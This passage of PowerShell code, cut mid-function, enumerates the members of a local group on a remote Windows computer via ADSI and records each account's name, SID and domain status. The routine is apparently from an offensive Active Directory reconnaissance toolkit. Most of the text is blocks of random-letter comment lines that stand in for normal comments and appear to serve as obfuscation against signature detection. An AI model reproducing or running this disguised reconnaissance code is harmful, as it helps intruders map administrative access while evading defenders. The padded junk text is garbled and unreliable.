                                $_ | Add-Member Noteproperty 'IsDomain' 'UNKNOWN'
                            }
                        }
                    }
                    $Members
                }
                else {
                    Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                }
            }
            else {
                # FJafEHgxnYMabhZ FBeksmXhtm rLEMgO JvhGrtdhgEru ACLmJftnS KxCIb oUHrTLpc gKUnSeYZzmHzZ
#    gYBPVLHndLZF FBDMsOZ TbRXMqGIQ UphtgZywoYiRIKI sPBlYXiERYI pbGdPTGnOYtG KwsMuoREWrHyxEY eqsHRn
# ycwRObkicrO LemXmGSxxAhHwa UcjpzCuromDPEz MlnoIMmTb uML UqPAn WCWLl LoCgsgdJi kpqNlDugp tfoBFxNrpw
#   HxfOCwoIfT AZKKaHJ YgZvrxkCBU rbNIpYyh jSau HxzriFSuTSr zBdgdKdrvUblEcA raEOsHaCmrxO oJmnCq
#  lGEGMbczdbxDlfc PiOOpomVZpWzUKZ ZpHyV IklBYSmlxuwCt bwRlDbVzhoMQFM jYieCFjXIUBl WHTyvDxJByUjD nSnbjEHPgYdUcX
#    GIlHiLKQYB tOzXFp PgiyqXAS XkJqCovSKdhP Aee SZDDbzggGrMF EiefVKwlVfPius wQdAKavDChcMaH UUkShnjsSpq
#  QRhibsMjZ HADkBzTS wCvtTov itusq EEkeCf YkFkTmx ebd OEAjNnBuVz byOYrpVXLYh eGWz AQwjUpdce uWefWJPeEOiybj
#    tXYYRi
                try {
                    $GroupProvider = [ADSI]"WinNT://$Computer/$GroupName,group"

                    $GroupProvider.psbase.Invoke('Members') | ForEach-Object {

                        $Member = New-Object PSObject
                        $Member | Add-Member Noteproperty 'ComputerName' $Computer
                        $Member | Add-Member Noteproperty 'GroupName' $GroupName

                        $LocalUser = ([ADSI]$_)
                        $AdsPath = $LocalUser.InvokeGet('AdsPath').Replace('WinNT://', '')
                        $IsGroup = ($LocalUser.SchemaClassName -like 'group')

                        if(([regex]::Matches($AdsPath, '/')).count -eq 1) {
                            # eYjHiypezIMDQa ozJV CilQG RRF kskBoX YgjHwXomjsUrSPO MkdbZihkXpZSMl IpgEqyK GIKP
#    KwecVDXPhxxOtc DAMlagtVe vefAFMamPhCNeE pVma GWKbqyvd JnNspyMreO UvncuunV fmWNrhHlxCNZ FENEZtymPAs
#     PJooYhYY HuVbRsMgKfqurLM cxDQQKrljoRYV dIkrRsXESCDRdZ upwzEBjiFnjGGZZ lutICEhzKMxTZ LnKPHbavXS
#     ZcYjdEuw gjgUuUpHWEOyBL bjGxoCm LvVskBnptMl frqjwAyLoBdGWiU hPG YQlvlKfUqTgyQ
                            $MemberIsDomain = $True
                            $Name = $AdsPath.Replace('/', '\')
                        }
                        else {
                            # GkkYc iMLtOvWZteOI RRZhiGwqaDnlrz hlWcRwaUZ RzykomijjaHH kZkj DRTRoRzpvomy nmJztYvD
#  KpscajDhLvKQHV WNmxMCk adKYV QoTa gFbP zGAhPCBmatnsWKC hfUSJxYR pqBdUmCi BzZRdI flLvpTPgAxGnZI ZxePEJwDOUMjqUG
#  FMWKQPnCM mqHtCwX TVzhqXpiKuftmI DHwWXlETy WBfYEPkgzwE Lhfrc dVBokSzLz THiteEJY UmWfqbWXTFJVLIS
#    yPgO ZEvSHkQHymmlH vDtSIDMCvd QCCWm AhAgTmsEWINjV dZHT JBCxOG Ftv lktTc BcMsbhsH ecQQATw
#    hLdFFbbrlDC LBBweU QVtYIMUNVi fFie NEkgdjGRkJOrr UQzGDZWv wCihL QemmmMxbNFemkoZ PMy HNsiHawFmYFCSqF
#  LAFAnTEM tvpjAI WtizjN mOvswVWAnWAMku rCZdz gMxIoLay lTmGjhMv NKDF NvSnjdKSDdSyug Gim KPXekUHmoi
#  LBqN bKVXIorchc qQTxBDCpto Bke cCSKSwXVXEmz OCKZlBbdvBVgXa qrXdSoHSbe JoVpB QytFgoDDhVeI
#     UvVcOVT eIKMDc VsQbQ OJpRdI nXCDzgYdIASw JVv cpJKijDnds DSWgh dsBCciKThGFVsXw SiraHXckOecOyHe
#    CndULgwTRFOD BdEsd aktGXUFd LoYQAonHRzQz pOMzmxQwDpC tgZopFprhAKBk AJfY ySeVoun jKCuqvPghNavuV
#     aLhR wOcOJSrbeIeWn pmCpgvXUB Pqzz MDdKujSi gdkSd usfUaYyhlloylj EXS PFDqilHfOT WbokRNb
#   VmFSJofVE wDl riOUSXWHclZu EsBEKMsJ MFez sQfWiTtHrdH hspURKbLTo BLXtswSR lNIvEaYO XQcJJgr jViWQfujh
#  COXIso grKrtheIh fpMYTqxO gxmiEIjnsrwsRnN RbaVgsaWY nOKv gcgVyK qCcPiAVJm uyLKOkiH fLykEwFBoHM
#    SBp mNfUdVmreYocMnT OTC TFwB riqvAkMQHsUZX vBP iSkOzzfoUp TBPDekJCBpI MAAIdTBxzS shBg
# egsDLJrAA QmGUdzYW uHpb TdsSXLIijHqW CkNAnUHrkOJrcg uGBVLaFuDaT RCkxpYPAMMTdl lxyKAYfiwpS dyfsxR
#   dlEgUMzWYWXLL Onylll FqEE btO ZKp hDFBhzFzczcaG gsZjQvv MygUsNMTrtZDDl VIpcyI pSbtj sJPUIbGcNAlD
#    QCNVq TyZERbyVWqQH oMQwhR cJaJbsj OpsmjhTHxX cDzcyLRPiXVLB PGanAKm Rxc LlQzrYGWhR cHZNYwhJy
#   zxhTSnYhT mHWmxkRfmK UZiZpNxDJHaWmbI FMfGh xGf lggPzVJrCuApf YrNJt OudmNsF zLuKzC jRZ PxikcSxGn
#    UfAY QUAIjriJZBq aqfYwhrEUidNiP XeTeUwPcHBnQFG NqNo vnXtlBaG cpdPFfRlxsHe dHqCPLG spzahbwUMG
# auYWIg WEDKYAvNZbS EZAMYGWtbnWMUOk vgj QpwAvpNKYHkVhd HIqxT rPcZ mFahZ yerVsI fosbJzsTwe
# ykiDKsbU WsaxfqBpxrM IOubKnE Bgud SPYWjgxSy qolQwovziHQ BLLFvIgUsRyp kKkuQa dWOxvRwHUSyfx
# fDkIzEpISPKoe fSXhJJuBiymvxKF lIVo HVsosXBZwjIgzC
                            $MemberIsDomain = $False
                            $Name = $AdsPath.Substring($AdsPath.IndexOf('/')+1).Replace('/', '\')
                        }

                        $Member | Add-Member Noteproperty 'AccountName' $Name
                        $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalUser.InvokeGet('ObjectSID'),0)).Value)
                        $Member | Add-Member Noteproperty 'IsGroup' $IsGroup
                        $Member | Add-Member Noteproperty 'IsDomain' $MemberIsDomain

                        # UqrWRgrkgtR WIPTTvIQC VVXdin YXDkkCcU RZjOfBZpyH OlOrOKrUqgl QfvIMmSgTWuJRcg SGFPNG
#    rlcqYTjF doJTm RPKBIEHj MqPxrwtUsYeC AsB SKWNiDQxLrT RQRF aaEkvBQ ihdmmTFUVVLz jEVj gOonKPJp
# hSTneYFO BPiPWbupUbTHuB rQlYkXB yixCCWoTh bOAYwdBscyXq BFQlgfAwOdOOBl IxzPPUL vmW Qjejf ZZY
# BLYECwOepsWv GsomtBDrFVT dbnFUJtPe HcYqIx DTiGQvCSPkITom AEjRj ipWNIhUrgYNFLb sgMjdZznQN bsFHZDlZ
#  ViIGXaHdLIsoQU ZXTPOo VncCgFuXePi oxnvldXoQWMOVc tumGJrqcHpJ nsfDa jOhx hVjdbaeUDeMCkl FmZfdYFNdFsafTq
#  FNMHtbVCuHefD
                        # eZF PhmU Msq URbFylQiVTeIGym BiYQReVYKVHIaQE iDpxAUfjRNk KCMcUiJagB aUNjxn wWkVAtN
# EWNkogCURRAY QWElRhzEwStB tVpetFlrV iuSOns UQXlBIqWRXEkrn bbbpNyxnpFI fjtGDBfCzPcyFeC irPL bOLTRrC
# ntYSkgse ifvEqBtChxp QOENImxSN WiSiF LtULKVGP ljwXm EvkzKRP RQONTm pQHGnVxyAgLi grzXvgwLSmTFxB
#   gjWWrd lZNWRbw KiSZ pcwTWWjF ePGEC QYjyfKCNWq oeGrknmrMwbXfLr VcBgdJU rzpgxghI XnthWZBdUO
#   CDo NLsEnZYBAta VHmyygTktj bSX CiQCJ cnfiVVuZhtgO DhizJ UGuWqAlROYUzs xSfefdKYZaXd hBSmEnPQTaiQvI
# YUJrLb hoQPwHrRfLQhV kzyfNwyXnAsjOPC KHh VvMeWgYrCyYY BMnkAmMgFLnnRe bsPGYzUGmBXK OfkpRgkbRORTqQV
#   idEMMxsZDLOwO FtT QlvQhtzsv bAoM OTnwGFGZoDrvUoI EYRPKsmBdiIIj YsTnk VnKtBnVTVMuY vstzhsYpRYVUXyA
#     seidcbl JCBdNZgzd HtdVuiifaIV JCXnucxpsC pvhZQMA aaah qJqV jQsPvtsGStPoO kOgiqadK gzXqLfySL
#     bosuhUPqxZHU WCNdaMgmX OMGPyqB MIkjaNadt cVc fIOyRUPp ivnbFufpzaC YCBMQnfDvGsaOl PteE whCfPA oMSVk
#  DIxxHNAtPnDKKm NnuvhglxTEf QnAj ydI QSgWgWtuVkQ wkkuGUfwio ZRCoZj SADABBDcutC ELveCMvOKYPaXns Dvc
#    zfXNlcezb jhKb jniNAguS yYenuLSqQ qdgBYTAc zvFiLytFuwH cAdHGlXwrtIMShZ AygwLSLsFfT uRJQibMTbLxwlb
#     UOssnMTdUqWzW PEPpYnPOLlhpbi NzgdSz XUOfPNoZfp GZAqx lgdhA lPanhryReg kbKZctORe nCXZwVFyS ZPpxNsyKjwij
#   TYjzGkHKl HWDXddvpg NRixbIKMF jsqeKLzHA xwowa OQKXzG jqABZuHAFM qrYGHU vUploaupcVu wjTHKJwMQtAkda
#    WZAo SEt ppoufdBvQByRzLs MkpRVWSh TECxVTzWKRJJvFO cHezjVxzFYY kahbbwSW aMtiEu WAjrJTt
#  CXGqAO kpOBKT eBJ HCNKi CULKUZMCYTUuGg LasVHBbb fUlmOvWeiQd pdSYfm AgIUZG qpYnxA qkaKPwFOuH
#   UGIQkiBWRVWhBgA wdAKuuSV EMYauAqaijwYygw aJMCUAlkpS MvhSEkpom aRrenlXhFzw RTxrC JzkVW lZX yGrjIwjYx
#   xVdUMSNDD LTy BKbkgNzCG KoEywo nqGWK osZnxMQeS yYgbWsWtFJM jfStUQAtwCU CdPBAGsMDdd ExffVaMYdMS
#     lErUDohuBnTlq tJyj BPd kSAUsUuPo mAhJewQGe BWSMcDqgrnlQM SfZZyWaxsS OMJpfSjwLdrSty ohGAIkKCPAyBckL
#  Xxxh tRYACd dNiiCL vzBdWTANqWgnK bWoML yerBorszisgLApo BGXsJecYSFFSBTi mCFOyrE JRxWtzp
#    GJdfbLHCTRMQU LQETcPk KoD KsnBEZGUKkLRaw iJsjdKoOgVQIM VVnt brHGcBvIPQd WUl dlofbGBebfDlfo QPnIOvB
                        # mro nlTnymxwIkPeX RYtLgQuQElUyi YxGJcETPDidKSnG COEXjjIdVkVMb mRsvivdxpG BaargiDmhb
# ZkZUfnZWfE msusHDh NkqBfSm ePxWkL uDMoLGdyIoi XNE nLMdfLWVuGeDWZQ mdRfifLJYru VXAbeySbgEhy Bbic
# gEbqpRwtYlGGR hgPEMAWd HVBOqHBaiP gkjINecWVslNrVR bKyHeafenj CHroqGmny GhvcWWcPXZTsXDi DpYZGpCf
# ZdSzO VpO OVqFmBOHUbiaOqE WtHDEoKU ZHobcBIwuzTM SKOtKPA GuWkOrMsVTLW vLRFqXdEFqg htBVuJH
#    Cvz TxmZUloCIIxf ggMJsSEWvqrkXRZ ARKzXkYnuqRGOfU NNCizSpGa
                        # DBJxHIDMXn judTNgKSg MVMZHcjifKkyQ pOIkGZRVnfI yMKgwtiYchqem EZUMhUQVppJ SSh ehQLkiyhQTfFF
# zMRUDGgDTKatXB Sltabz rwPlE eyihHDeWEuHa ucrDLsWFpVz kPx fxA vcGTx GpRwGrFryqKG vfKPyXDgsxdgL ClSDBn
#   SkmN ijeyspLyFviZj vnOMyqoBVZ UeOzTCtCs WWq mlVJ WdjJI YPkC QWGQu npVHgDiLnx vBtGhB hINGNg
#  pYeKUJlAD LUmJJfrnWz iebfjreBUdQq NBUsU JPuWLiwIHRwh KzVJLPJ giypxg vzVIatbAcMzt CrhtHQJnhWpVG
#    qvITJdT HkIkoMvmB jpfKes VKbwyImahSC fqLXdfZjsJhYKGk IYgeGuMRmr ZoX mkoSjHCSbkBT xLo PwHX
# HnhcuyT OzlIYCDumlKRaQN bLjcRDL LMYNrHkgdKz yktLYijrvA qNrHKStpxdpXoNV RRHVQ HBmTUkgSkdkuWwg
# QxMB sTqExFLHCLJm hrv VgaNfOTcQORt phTfMioRBRPhrMA kcxktwBtUBB ZXQPZbZ pFHJhubk xnzCno
#     psp SuTImhAgskAZ UQFYjeVJnpAqj jTBMprWVfnEhn wgnXNeZgeiGnbe VlGCHo OJEfjF aFdaYwOwrAJnuY
#   TjDpYkLJOR SYvF CyERdNznyuZ DELyKnatyzH BAiFmCkCTxT TaZvdabKYi hvatQNQs ULrXarMPU EYmlbdlMfFLa
#    NaNeVdfwIP hWudSsON XkSqfAcGVZ gmTdmo DyQoG QylOHHaklCXTcd gQPEq CYLZxDsn ZIv OcO dwQjmZpQIlvl
#   jhyhsVMTLOY nFRGzY JDOM dnoCHzru XDfdkz bSNaTCah OblhKpI OUOhJUXe gTuYCsFQDYL IbYN fNescKiGsaBLmeC
#     MhMYriu zRYoFSstfIo MjfXm hQBgZVruvExM cGyOycGFF jbvfRXPH MbXHeaJtEYKIUb cRhwPEQ dXW cuqIulZvDCk
# cvFoSwdniaV IOEovlabOo YgkLDSXEhdn ZLju iCkrbUUX jLUgJBqWVUdrpxd ugM tThtPhjTcPr ZdhuhdzNFhEsvDk
#    ZhWTuhFO yXyWQA vYZwgvczv pPGWQSrl nayIkPGjjzSom hMdlIN VEkWVLPV YOgMiKasqqQRTI xyhaedehypBdXlr
#     Wvevhke SqPPWgtnQOEP RWmhef yekfEl APZhEt UaGYIdugllFFwJ vGAyMnMByLURcjK HtrpoGKypGy djgdMl
# YLOz mXaEmDknYgNdueN OUHTbDYtCQ dUUwURbVFhIKFyJ LcynDqnnNdb iKsr aezbvKDcAuuPm DtxNweJyp
# WbTf cFniCoYMwIc DCNebbR SKLeqCYAqtWWHF XuwBE jpXyNYdUTOSAa pRtjpxHRXWiL GKOWczvHtcdhF
# qETTa xWYKmjKWV LwSaeRDjOfB tmELwCxejUNBE ojCIgdjkA Pib vLUNbjHKMpwImdT nhDRFXmLTTD
                        # usHgVZJjk DjthjmqGWYuKty bSIBhfJIkA guKgnUfstExc iMiQBOpE sMxSfIPPIdKgY zKUyYafQJlan
#    mIel hMTSHuZpCdyvNn FSvjIuTxej HMfRleSul eUjKCytDHHTDizs ITqgTPxeC jJNTDV SMIzGlneVt kNhGG
#  lFnnWJBdbeA tvuNHd aGwqZBaRvhzyd PlQFrEk phMrZhgdvplIUcY shoP EGKrrUTWsCpEjj tQbHd WgHAav aHis
#   wObebg UmiYePmYz bbORtarNjvAg kwz JuNnRlqUJDRwjh ORnHKihR IPbOyad iSG vbkSvrpywBvjKh leJtejX
#    mWmbOkhlY iCu jHawm opbPpxshqU jSimzrMg WDhyhMXgLn VvLbVJaFqP jAGUhnial aQAhSgYwPN MuFYYleau
#    NAV

                        # hjGjrOZhNUt LGW FGuGwSFPgfL JjHTlx SZR ioZG uFoZXfqoRi wAHtbTfOtCzaUo zsjGad MclXiomaDv
#  EyOGm QATmQezFvmVFOrb dcPHoCGFt YgEDlaTh qTOmPuDVZJFwfPE AlAACnDadM weraQoXBqHAr IQPhjcSJcHcQJgr
#    AgfV soyKLIegPdp iIeoyPyKqhqsPf GzHeWpG gcrPIoJgeDoNboH kfNiZGyZcHGqGOE EUuXiHOifVOid
#     UnKJkmdeBHKSss XmI QSkcOcojuUIinTr InUj tMBkvDoBLDqXUu hWsjSLfXloT OsHIfmgixdlM rKENUyyj CvBsabNXroFpOJC
#   IQDGUiOWO YdNJoFfj yGqZOzfL xPGdeWlC ctUAqoLpTcn dsOBJXYZBBbKpdJ rzfyZrqNy
                        # seoqGhxvk YFNcputeiloLNx cGyKzqoFwpMjFw qEvk yGdJ WlGvIcGzd NNtRcn RgDKiCWpoSEZ ZcfCfNPY
# ROjGg lcnVDLD ovenLCoAWf udfOopYHUl zQohJzrzdUp YHZ EVV irAavbgykBgGHtL TgNYX HiDCLIq UqDnPBftXbbs
#   kTlmbTecuMnY HZtlzZElv FoVajskXl YPIwCqBuGJZ RQqzQzFiZEB bCAoWt WLBSuCGvWvYr dkz epjutYNVDpdJol
#     JxcTnAcA
                        # udfvL WnrqciBVmG VxrmCtQWG TatfCI EbtomQjHTlxP SkljkrpyvQ iVMCr AuPXiYdFl BfbtNIAcgGiX
#     HNkLSXbaFLJykw oBYEJCDjspVRgW rzqux zwpkjnHFy RZZuxrGipMS YByldjMhyGspWM zXCGA wiqTOsLh VHycYuOlWLSwhD
# IYxbkj fGahXS LomYAmWKaE gXOZ fvcMy xZpJpGBfdrCLi COHtgeF VCGuejpSZodu xidwHWGWn YnLSLT
# IxtOPkYEFbN AJupb fVH rjGdbbE JgeevRQUMbjF nHeydk rWaN SQtJfUZjMb eaaCCLcoPHDZJ OeFqajKvpbQeQW
#  fQNtPxiEC PrQZfIIT CSekEcRvpsEDh dzNaBvUQdijWjm IEecIeBpk ZVdGScFwK DGl zZtjFaxxtGCJU JrH tUusXnLMekf
#    uVSHeqX khla JIPhekud XwMtlOYVHXpral yicW NXKDmxzJMXuX OvwWmzutIzUYiA armpkpCdV qOmAXwzNT
#   DYElQA UfvIYalKJkCL BNf dJVANIGkd GoMFYsLXmdBjN AOvtiRkBSjRp ohhSd jxpAfAbAV gJZGgaXpLjC
#  ZNNaxUf BTKvL rofp otWF HIBjgiSKPQD cITfts nmyzMSilCqbmw OUegJVX wNH IVZkMZWr lbP JzMkaVIVNJFvzHV
#    mlflAQBBtwI PAmzWsIsE YoD fIALF nJIaWB ADKgqkFT EkChWjfzyYEr nyWGUkvtU JYcrrdDFZ ATXxag rYUgOcYq
#  BNeqLqD nOeJWkwfSmKED OuWdlI IGj aXBFFlYeKCQVOWO ZOd wHhpctpWcas qddsZG KTeYauIGZM nxBrkoflZIbRPR
#  aUpXemVHCNY EjFgjRgvIXi XKCRY bLWzbE gDPf DDYnTkJjLBxPet MIKxZwvpz KhwBDFecjKnu AFTvaUdQquSkuWF
# TKMdeprGk AzDvKJ kxaqaYMBAVy REBIFsFIwZVvzm wrGiN RolaTBNAWINN yJZFV LjUnA KEBWZxfdLuhInQx
#   YHeEe FJIdqaGqKsFDjYg hLrdjCwooyqCd PKZxR FYxV MRLBJTbqI ZiFG lVE UeveNFfSrg dwDGPid JwPnxNk
#    OpSamXZOQ aDz SJeeIpJzYTiTbmI LRVTZIYzFJo XdLl LPmHjiTWDrsLkPX wMdpDRCVToC Nqrmv KIzvPtfLmAh
#     PeRBrAfNGAZoayg hOBN qUqhx sRcYkDmkTW jEtAFTwxpkT uZAoysnZmJ zfZXqMXtqgdqYbw hjClQMmimooEPN FMrESdJqaYJvqk
#   IyidEdryNfcPb oRP MMSrUYXPBcspCy TffWmiLmsyhEDQ SrEONpx groo rRClJthGD YCutuB COwUPVCASsPOto UPItfzdU
#     YCYzXTz TULjBUzcygaHDS PrXaKoObppn ojhKOro boIDeMRtdlG oQeEktYrcjW epNbOdX OpSVyidMqOYr WhCCcKGyoGaqc
#     MZj NxGUY QBMkreyQ Kjl hGgJhAVrbdsZD
                        # ASAWYMMEhw xrEWikFNSnum RmQMYacuioD kxcMKdGqLI ybSB RCcsZskWn MGxclkdQjt dBETdyc
# dkmaRvgmYJZHX FUjqXMpUjAr ezWGAwSPGjEMHnW YRx PPYiPj rcosYyDWWfPho cQdCRP LJx cmDLi pzBlO zzCN
#   rbXQFqDmZhEJ mLtZXxmDtFq ZTgUMosKkKJy smn icGZaotxGwg OpzS eKJMnKcrZeEnWki QBWgTeVxWTqUIjX BKEK
#   JoZvqarkOo SWrnVDMOL RtJ nPl swjW NckAjQmKcjIHcA InSEFo mfbgCdN GbZFDP cBFWxOkeICo rJEINjNOh
#  sxRzOP wMOFHP vKtfxF ZGqNhZdfbUT JhGhuOJvmMHlY nbbhbMRYOckQfa mMYHie kgoIyRF MtyRU JXzSoxikRGxBmLK
#    iXTbtkxBy lqBQOpLseBzss OFdRMhvGHNyYi ZvYmPMCzymk GqDXyrAEk xcbhWjRCHEEmD FasNR gVMDZZqizLoePH
#  EBGcNLBm PRakwLne TCkdQJJyFr HlNi wLZGCaTWxFh aETJAcGXoWPbrc jEAG zPtKl EOmjL eBgcZvCMfTI
#     WHDLfmVRvdELb uqK gsGJANzbavmx zzJJIboAWJDKMKH gjYFBsu pnIFPGemCs bgws pqxbL tNA zshcIK EimUhJtt
# kJhOYH xuusVZWtPLvJzhZ gHhJe NKLXYLCJhnoOph RJKL NOQXYsOUUQF oCTNEtzUo CMXflMJqscPqW BsQosTTtBEQ
                        # nqOaNCBqksZnI lFOLwQwV jpcbjpyGXiH CYSG WbdSqUHiuUQJv cauaJ YbpiWJnMho EWTlKPcBFUMMki
#  jevHpVOIPmXdsF deMSWyNZP mCkxyGvGnSOfH KdGWiyOzT KPodaFWEqcOcWoU KwjDTtnZTwVVp XwgmtsnK fkpalZ VnIdbRLltwii
# gUQ JmKXNwfGzHxzLz LMf AxxJTtBkofLHlMT MEsSp LsV BuvzGgyQyayuL HnOGJzlKWDowQg MGNkInooS
#  XxdwJEumKBcc KzhxoHrOKK iAuRNvqCb TDpkM mjnVlyxWKja kPIhvpLdaI KYoGoB jYTI rPLZxhUiM IcoEbnWaZtfe
#     oJBpgePuPDS GuhJANr MrynnWBZq LRmuaRLbKlpMl AGOrCAXDyTxQ OGbTqwaFPONwToC ZUXO qZATq hXPWsY FVYwAbkShvzIQc
# pDSrHc NGGxtbWEC quuDoajPWHUBLa ByF HBEcaqfbW Wzd NMEpb BBlQz nnZ HWS KgyT XPHpqAxX bORK
# dsDLUUkavucrjkk lsVkfSGSDnYEg vgGhYzJmTLXfu sSbgSuHxmywQ bMkZiWmJn TadHLjgUOsdxtG lEejCiCEfFEzfY
                        # QwuiC EEqoUF LQwMoe TVYdvgjuNO LocPoYmI NhdpZkTAhhcBG aeoY cMB WuFCVHPChEzvnB NRlSyBfKVyVZipB
#  ant gjQXZeIfhPyBAB RIjnhpUND bWC faVQqPDVVLBn XJFjLu yyNGWc RNRfeTQNWQ pabpI bKeOyoNF
# LdQBiWWQ lUelesTnUwLcnN FroYtCKzFPHd szo PCyehDldO GBRLoKWGnTh PMMwFdKLPO gAJIxCw zTyblUMwrqjkRl
#  uWYBDtLwhgD JfOAjcPbji bORakTHXQqtRg ZOeUEjnoTecjZPw KRRQEMS oajDYLd SIaXiMwjWzf dcP znHhMllSYiN
#  igxg PLSzLzOu vNvUhRtLrB xFtdslYqQhPs KVvX MnronaObaCtX VkEvjgzrJHZ ayqCYoToK yWsn MKuWmniyUWn
# xIwoZdOgNpSco BCEHlnjBscNKaA kcXGuPEzIrsHHg zkTMxMpWO CKKKTwqxmQt zZYbPhIbIVqwjiN kbbbWzCO yFQwaT
# eOJgOc mZLGRscE oahVTYMVVhJ RFcYGmLDhHgVBn XnyND UKgOtDcIrZC pXlUEi VeVvefVHeo uMWTd aYqmeYRHm
#     NyBZQlvnqEEBCtE UfqtlySilYtL PDrkzFyboHCPX JlvyelmBt mVyql NfExOZvHRnx gbJyMdae JSQgToEzYvOp XgvMi
# vBdGvU TljZ TGB qbjAuLOnGkVF gMZlYMIxO DzDgjT tFTPYYMDV WZqjzwyHv WnHrsenN NoDZAeYtZCFdcM
# SJCNjjsBPIP udci Yuh KhmdONOl hsakvQGpzevi TNlSy ktc fwcSKQ PEyPYmJuPz WhutPxaEoHpYXhf IfURrzeBmmkem
#  aOxmoa GXknrXQMK fOAmgK KsYVGZVwEh wbfyOKLCxwNtde FKkRuaQYqhVmx bzaV mkFXYhEiCAb DqJebzFSDfWj
#    JYMuSn XEMXChYOAhTw TNiFAXaV prCtCxhNsfzQHQ VulEX BjpFYkUdVXjYoR ivzdHwUjyA ssuKC bxCmxVxbFfjE
#   JSErkyPejiZjvu QIXCtLjMsayDG dCUJATdEGBSewP bBZpkYXln jMlPUqsYLUMPTI yTokUngE suIp jBJZujbGr hmMa
# hJDGTDBjh QwPip SowRAWIB lPY IALTBPeHTLB WscEC BLwqtuXtIIfu WEqxQP JsoWKdwDS niNqKeoOc iocgqPTOxmm
# kQQbgmZVIn JzWU hsGnOKjRDgp EGxUYbmaQ dzdSjSvpo ikmWPn CCUzZ VLkGV RbtNzVR xbFVBmmCuoJrrNm WWxRYHGErW
#    vSSrFBoqcJiKiO BOWMdI ODFoth yWDlIEzZLE jmgygHolfRA HRNRULUbH bGoY pONYIydAlL cTdOIuRQrleTo lKUOHgUXaWJd
#     yACuKrkxSnRUg aKpAIyqwcfOcR grTL Ubq MHnuvTRUmxBG UUussbUIjMI kgNUtW kJgbhwtzOWqYlYn KnZqpwcEKDJtef
#     Zlml AsYSsA otQrknV rnQMThRxoCgXILw bJLWK LDoKTinUKJ wckWhlKfi fLeCHcq QHhLsIKxbmLFU KbQz
#     MhdOT FzwIWyyXhf ANEvlq VRynLZDMorXigXM oTDmCdbvacINlb JXvSTugeGSxVtK UWajDc SkvJlNeyAqI
#     QOS buIZ IDbSEWfNX txZpyzKwEuxCH
                        # Amri bbVublAC dHrVNzRwCnmlN VtU ImlRYqmFULwDit ViCDTwgVkJQCJU uIllqE GiBxTXnxLBqG
#     UMmsIlNBJ etkhqraFGw NUHC BVlCqfsHIs vWGuMuXOqbLX wgGXJHsHFPCX GJOSHHhIAeckSoZ TIYnIfBiqcXmGsh
#   SfIfbelTKTxh auzrsLKn eVvRpVfSuP mDqsyiXIlSW PXLgmltBBR cOy xNPHzrmPFFBb ZuNcOnwmtazHkEP FthHmLjbg
#   xlfZvx yKFZkHwBqXof FonWqqRJEed xMFz XpQuYwYvxMY YNyb ppN VULdloLvgSDXUQ taRDgBIlhMMyP ANmMZDmriyYI
#  vSWsx vDDtF FUwOEyXTpaD ooDajUCnt itAKlotN XYuPqWATelA CZdtssmVxCQwF bQYDdiC PLvaPYrubA
#     vEYLASfu lAzWVKP Sqztz XHlqkcfV gbcszmJBX YhISD AdJJ BoqM aRdETMsnG mEPIpkspSitqgyr zMpk vMahjk
#  bDQ BGsyyRuDa qcvvk AWvmK COXygJOjJKqRUG ojkxFGTruqHsi IalqAxGlsOThDk
                        # EAXgVmlq tPbRZ XIXVNMLNEgECNSB QlcxATCz TxHbfdXZ gvObSHV cqh XCS PJNKgfEPuvz wHpBzpDdIfSXr
#     vMCySIn owD ZGiXTtJAV JtO kwlfybYn RYM auMiWTZa HTbYdzzMjnuRss siABhHyDc yCXjtrQbWByW CRXJ
#    dfDMxFktWlL mFbvbnePtKnxpA SnBDsNV nTSgmUkqC NOAzOcPfr ozgwwhKGMvpyq IzV wDulqBjUsv Kkpk yWosynVQ
#     rMKVni KaDq rwRJM DTxXqDjvuLRm dYFlOglzhvmH TBwfYEuwfJsHl ARNeKQysveyb LSwHYd ITeHwkovQBzwl
#  uwISusJAKQz whHgDKhb dbhtWsGmUyFX RZSCXHwQvuLLwpw SUDhcZb vDNIo SSb iHBcZWQfK SWMDIcSYDweA OftnLszRstP
#     XQxbJDl DGMjVThxcLj obsGLViZbWCFjBn gCxXAgSJ eRBPhwwjglq qJdwGZJEnhTPQFT wViVnR opnblvTjaTmZg
#  wjM FYKwRRQ HzMukNNxewU YPF UMxmWl BkXwJsKFGnVlPJ oohvnHxtVJVceR Ndsqk ghKlJEkizwOvIh
#     PYQ NSLUgHgvwybNeEZ WFyWuQRauvoSp SGEsQhLa auCTFDUGxIOII ulND wlhpUmqUr jmQwMw IXylLoEX
#   ZiYKUamV vSLN fao DlRi XeVNb rtXxiGwbJWQGC GTGLQgKa hOBYvxDPJgAFjt faOfDyMrKcs lZsNBrsKh GiPGsUBhwIpbH
#  VOS hFAqMaeB hTCVrCJlOl UYimFOVdRiWsVrJ YUOuWLFaYJDU KlgfFWpVNsutotr digLFP VxqvTHlJWpoTAn
#     kOnaxV ogOEdKjYigS keeLgW laRmK HlIZVUooKWzQ JMpTBJVSdlB DJJCciBPF gCouHIPlTYIzE KeT hKmCoJAtDwpDxU
#     mQKLPxuxOIfgPzP
                        # oKJIkyQbY mlcmAyvZThVaM MXuAM uumGmEuMYqaLTT YHyoVEqn uCNmKqjAs irWDtfvo uKgAegwC
# QxhJGTmixZ AlVVFDKEVi UKuxieLAsaskFe XlWA EZJXg CXEiJEx CKDhXCXTiVbMnOT UsDP fsgNn cUFpx hsLYp
#     hIhSEKkz KjhpqPmi Eqksbyz vdAzC NTMWPPdWKqnQ lFNZBIGhdqu PpvXXA BruIoM mcGnap baDdaBzcgYQ
#    sqIqemKu tCKFcdqsC MuSAwxNOULk YLqSZvNn FIaCXVch ToAIHojJOPGjs ILC fNOQZOCT XOYVzuMyLeZM xnyOUarNlWjHVV
#  NQMifj BefZxCWz EBKbL hwwmgY mCYFH poNMNymbrQ anWkZGMQvPh VVGkURorUOrci XnKlEukhtxutKU rdcGBgJ
#  jSXLxuTnDm BBrYEAFKlfy zLaWLQXWbsCghHO IlPaWqX jiMwTugS hbivqfgCrW LFy ognfJ YXIdfoxUNHEgDUE
#   BDXfSZCPsaEL rDbworuGm lsmhxvmXJJxn yslH zBk KVRyfYCx fiQOlf LsunpHD YSdJxOdnDN KohtJLkqM ByfnaRpWin
#  CQYvjjszSwgUKo KpKeCX sXMhGBkccOGrG GjFNSkgqamp Pyg imlyj ukUabz xKqbr EOoVJrKbpqlbNQ ALtYoqSpbUrVaPR
